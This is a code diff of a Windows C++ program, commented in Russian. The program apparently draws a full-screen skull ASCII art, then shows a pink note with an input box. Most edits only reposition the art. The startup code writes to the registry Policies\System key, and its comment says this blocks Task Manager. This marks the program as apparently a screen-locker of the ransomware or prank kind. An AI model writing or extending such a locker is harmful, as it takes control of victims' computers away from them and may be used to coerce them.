@@ -2,7 +2,7 @@
 #include <windows.h>
 #include <string>
 
-// === ТВОЙ ОСНОВНОЙ АРТ (тот, что с черепом) ===
+// === ТВОЙ ОСНОВНОЙ АРТ (справа) ===
 static const wchar_t* kArt[] = {
     L"@@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@*--=+*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
     L"@@@@@@@@@@%%---=*#%%%%@@@@@@@@@@#=+@%%+-=*%@@@@@@@@@@@@@@@@@@@@@@%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
@@ -58,7 +58,7 @@ static const wchar_t* kArt[] = {
 };
 static constexpr int kArtLines = sizeof(kArt) / sizeof(kArt[0]);
 
-// === НОВЫЙ АРТ (верхний левый угол) ===
+// === НОВЫЙ АРТ (слева) ===
 static const wchar_t* kArtTop[] = {
 L"                                                           .:=#@@@@@@@@@@@@@%%%%%%%%%%%@@@@@@@@@@@@%+:.                                                          ",
 L"                                                    :+#@@@@@@%+=-..                            .-=*%@@@@@%+:                                                    ",
@@ -175,10 +175,10 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         int cx = r.right - r.left, cy = r.bottom - r.top;
         
         if (g_showNote == 0) {
-            // --- СЦЕНА 1: АРТ ---
+            // --- СЦЕНА 1: АРТЫ (РАЗДЕЛЕНЫ) ---
             
-            // 1. Основной арт (по центру, но чуть уменьшен)
-            int art_fs = cy / (kArtLines + 10); // Немного уменьшили
+            // 1. Основной арт (сдвигаем его вправо)
+            int art_fs = cy / (kArtLines + 10); 
             HFONT f_art = CreateFontW(-art_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
                 DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
                 ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
@@ -191,13 +191,16 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             SetTextColor(dc, RGB(160, 20, 20));
             for (int i = 0; i < kArtLines; ++i) {
                 SIZE s{}; GetTextExtentPoint32W(dc, kArt[i], (int)wcslen(kArt[i]), &s);
-                int x = (cx - s.cx) / 2; if (x < 0) x = 0;
+                
+                // Сдвиг вправо: берем центр и прибавляем четверть ширины экрана
+                int x = (cx / 2) - (s.cx / 2) + (cx / 4); 
+                if (x < 0) x = 0;
                 TextOutW(dc, x, art_y, kArt[i], (int)wcslen(kArt[i]));
                 art_y += lh;
             }
 
-            // 2. Верхний арт (маленький, в правом верхнем углу)
-            int top_fs = art_fs / 2.5; // Уменьшили в 2.5 раза
+            // 2. Верхний арт (маленький, слева)
+            int top_fs = art_fs / 2.5; 
             HFONT f_top = CreateFontW(-top_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
                 DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
                 ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
@@ -206,19 +209,11 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             GetTextMetricsW(dc, &tm);
             int top_lh = tm.tmHeight + 1;
             
-            // Считаем ширину верхнего арта, чтобы прижать его вправо
-            int max_w = 0;
-            for(int i=0; i<kArtTopLines; ++i) {
-                SIZE s{}; GetTextExtentPoint32W(dc, kArtTop[i], (int)wcslen(kArtTop[i]), &s);
-                if(s.cx > max_w) max_w = s.cx;
-            }
-            
-            // Рисуем в правом верхнем углу с отступом 20 пикселей
-            int top_x = cx - max_w - 20; 
-            if (top_x < 0) top_x = 0;
-            int top_y = 20; 
+            // Сдвиг влево: отступ 40 пикселей, по центру вертикали
+            int top_x = 40; 
+            int top_y = (cy - (kArtTopLines * top_lh)) / 2; 
 
-            SetTextColor(dc, RGB(220, 40, 40)); // Чуть ярче основного
+            SetTextColor(dc, RGB(220, 40, 40));
             for (int i = 0; i < kArtTopLines; ++i) {
                 TextOutW(dc, top_x, top_y, kArtTop[i], (int)wcslen(kArtTop[i]));
                 top_y += top_lh;
@@ -230,7 +225,6 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             
         } else {
             // --- СЦЕНА 2: ТЕКСТ ---
-            // (Остается без изменений)
             int note_fs = cy / 45; 
             HFONT f_note = CreateFontW(-note_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
                 DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
@@ -243,7 +237,7 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             int total_h = kNoteLines * note_lh;
             int text_y = (cy - total_h) / 2;
 
-            SetTextColor(dc, RGB(255, 20, 147)); 
+            SetTextColor(dc, RGB(255, 20, 147)); // Ярко-розовый
             for (int i = 0; i < kNoteLines; ++i) {
                 SIZE s{}; GetTextExtentPoint32W(dc, kNote[i], (int)wcslen(kNote[i]), &s);
                 int text_x = (cx - s.cx) / 2; 
@@ -252,6 +246,7 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
                 text_y += note_lh;
             }
 
+            // Поле ввода (розовая рамка)
             int box_w = cx / 2;
             int box_h = note_lh + 10;
             int box_x = (cx - box_w) / 2;
@@ -317,6 +312,7 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
 }
 
 int APIENTRY wWinMain(HINSTANCE h, HINSTANCE, LPWSTR, int) {
+    // Блокировка диспетчера задач через реестр
     HKEY k;
     if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
         DWORD v = 1;
